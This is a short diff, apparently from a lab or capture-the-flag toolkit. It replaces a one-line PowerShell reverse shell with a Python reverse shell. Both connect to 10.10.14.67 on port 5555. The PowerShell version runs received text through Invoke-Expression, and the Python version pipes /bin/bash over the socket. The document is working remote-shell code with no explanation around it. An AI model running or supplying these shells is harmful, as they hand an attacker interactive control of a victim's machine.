@@ -1,1 +1,29 @@
-$LHOST = "10.10.14.67"; $LPORT = 5555; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
+import os,socket,subprocess,threading;
+def s2p(s, p):
+    while True:
+        data = s.recv(1024)
+        if len(data) > 0:
+            p.stdin.write(data)
+            p.stdin.flush()
+
+def p2s(s, p):
+    while True:
+        s.send(p.stdout.read(1))
+
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("10.10.14.67",5555))
+
+p=subprocess.Popen(["/bin/bash"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
+
+s2p_thread = threading.Thread(target=s2p, args=[s, p])
+s2p_thread.daemon = True
+s2p_thread.start()
+
+p2s_thread = threading.Thread(target=p2s, args=[s, p])
+p2s_thread.daemon = True
+p2s_thread.start()
+
+try:
+    p.wait()
+except KeyboardInterrupt:
+    s.close()
